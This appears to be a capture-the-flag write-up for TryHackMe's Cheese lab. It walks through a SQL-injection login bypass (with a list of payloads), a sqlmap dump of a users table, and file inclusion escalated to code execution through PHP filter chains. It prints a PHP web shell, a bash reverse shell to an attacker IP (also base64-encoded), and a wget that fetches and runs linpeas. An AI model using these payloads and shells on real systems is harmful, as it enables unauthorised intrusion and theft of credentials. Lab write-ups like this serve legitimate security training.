# TryHackMe Cheese CTF 🧀 Writeup

# Important Notices <!-- omit in toc -->

## ``nmap scan``

```
nmap -sCV 10.10.0.223
```

![image](https://github.com/user-attachments/assets/c6f79a9d-c448-47f2-9fd6-1ba6289318e0)

## ``gobuster``

```
gobuster dir -u http://10.10.0.223/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

![image](https://github.com/user-attachments/assets/6ad6f0aa-b52b-42d5-bc70-7a7b89d02d90)

## ``ffuf``
> you can sue ``ffuf`` to fuzz and bypass login page :

```
ffuf -w SQL_login_bypass.txt -X POST -u http://10.10.0.223/login.php -d 'username=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 227
```

``found``

![image](https://github.com/user-attachments/assets/24c827a5-71b9-4e89-a18a-ebebe14f79fb)

```
' OR 'x'='x'#;          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 166ms]
'-''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'-''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'^''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'^''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'*''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'*''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'=''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'=''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 108ms]
'oR'2'LiKE'2'-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 105ms]
'oR'2'LiKE'2'#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 117ms]
' UniON SElecT 1,2,3-- 2 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
' UniON SElecT 1,2,3#   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
'UniON(SElecT(1),2,3)-- 2 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'UniON(SElecT(1),2,3)#  [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 106ms]
'||2-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 94ms]
'||'2'||'               [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'||2#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 94ms]
'||2||'                 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 99ms]
'||'2'='2'||'           [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||2=2-- 2              [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'||2=2#                 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||2=2||'               [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||true||'              [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||true-- 2             [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||'2'LiKE'2'-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'||'2'LiKE'2'#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'||true#                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||'2'LiKE'2'||'        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'||(2)LiKE(2)-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
'||(2)LiKE(2)#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||(2)LiKE(2)||'        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
%A8%27||1-- 2           [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 136ms]
%bf'||1-- 2             [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 133ms]
%8C%A8%27||1-- 2        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 133ms]
:: Progress: [804/804] :: Job [1/1] :: 334 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

----
----

<details>
   <summary>inject manual</summary>

> first try ``' or 1=1; -- -`` but not work

``try union``

```
' union select 1 -- -
' union select 1,2 -- -
' union select 1,2,3 -- -
```
and Boom!!! 

it work on 3 columns and bypassed login 

> if you try to extract data from this and appear database content it will not apper ✅ SQLi exists, ❌ but data can’t be extracted via this page.

</details>

----
----

## ``SQLmap``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" --level=5 --risk=3 --threads=5 --dbs
```

``found databases``

```
available databases [2]:
[*] information_schema
[*] users
```

![image](https://github.com/user-attachments/assets/826eb9e0-20b7-4a08-a192-213def942148)

``find tables in users database``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" -D users --tables
```

``found users table``

![image](https://github.com/user-attachments/assets/36fa6cb3-89fb-493b-8c00-afb08453340c)

``get content of users``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" -D users -T users --dump
```

![image](https://github.com/user-attachments/assets/dddc5c59-a882-4c82-b594-6f474d955d26)

```
retrieved: 5b0c2e1b4fe1410e47f26feff7f4fc4c
retrieved: comte
```
```
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```

> ### tryed to hash password but not found crack to it so try to found another way to get in system

## ``LFI``

after bypass login page found :

![image](https://github.com/user-attachments/assets/51963ef7-59a5-4c25-8bfa-81317651aa83)

try to make url like ``http://10.10.0.223/secret-script.php?file=php://filter/resource=../../../../etc/passwd`` found

![image](https://github.com/user-attachments/assets/9231f3b9-6553-4b70-b9db-40bb92ee361a)

Boom !!!

> notice we found in /etc/passwd our user we found ``comte``

> ### ``that can make use do LFI2RCE using PHP Filters``

we will do it with ``php_filter_chain_generator.py`` >> https://github.com/synacktiv/php_filter_chain_generator

- First, we keep it simple and generate a payload to display the phpinfo page to see if filter chaining is possible.

```
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```

![image](https://github.com/user-attachments/assets/71137a37-0302-4072-ad03-5a5215aaf5a0)

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

``put this payload in url``

```
http://10.10.180.156/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cco..............
```

![image](https://github.com/user-attachments/assets/52d5ff76-1db1-40fa-87af-4fa9e10296cf)

> We give the payload to the file parameter and see the phpinfo page after loading the page. LFI2RCE via PHP filters seems to be possible.

``Next, we generate a payload with the smallest possible PHP web shell.``

```
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
```
``put the output in url``

![image](https://github.com/user-attachments/assets/466dee0f-ad17-4e3e-88a5-57f1c7d08f29)

> We now want to have a more interactive reverse shell. To do this, we spawn a reverse shell. We build a ``Bash -i`` reverse shell using ``revshells.com`` and encode it in base64.

![image](https://github.com/user-attachments/assets/6d5ffdb6-ecdd-4d81-b797-3906d631d02f)

```
/bin/bash -i >& /dev/tcp/10.8.47.102/4444 0>&1
```

To avoid possible conflicts with special characters in the URL, we encode it in base64 and execute it with the following command:

```
echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguNDcuMTAyLzQ0NDQgMD4mMQ" | base64 -d| bash
```

We set up a listener on our desired port and call up the page with our reverse shell command.

```
nc -lnvp 4444
```

```
python3 php_filter_chain_generator.py --chain "<?php system(\"bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'\"); ?>"
```

```
http://10.10.180.156/secret-script.php?0=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguNDcuMTAyLzQ0NDQgMD4mMQ|base64 -d| bash&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

and Boom!!!! we get shell 

![image](https://github.com/user-attachments/assets/c24561a4-e88f-4c7d-a96d-3561eba6aa2b)

> Upgrade simple shell to Fully Interactive TTYs

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

``ctrl`` **+** ``Z``

```
stty raw -echo && fg
```

![image](https://github.com/user-attachments/assets/a7e0dd1c-526c-4fa6-9a98-fbe66b36c616)

As www-data, we cannot find the flag directly in its home directory. We first conveniently enumerate the target using Linpeas.

open linpeas dir in your pc and write:

```
python3 -m http.server 5555
```

on server write:

```
cd /tmp
```

```
wget http://10.8.47.102:5555/linpeas.sh
```

```
chmod +x linpeas.sh
```

```
./linpeas.sh
```

found that 

![image](https://github.com/user-attachments/assets/576e7430-cd90-4f0d-afdf-d1bdddee6bf3)

```
/etc/systemd/system/exploit.timer
```

can help us later when want to get root 

found also that we can write in this file 

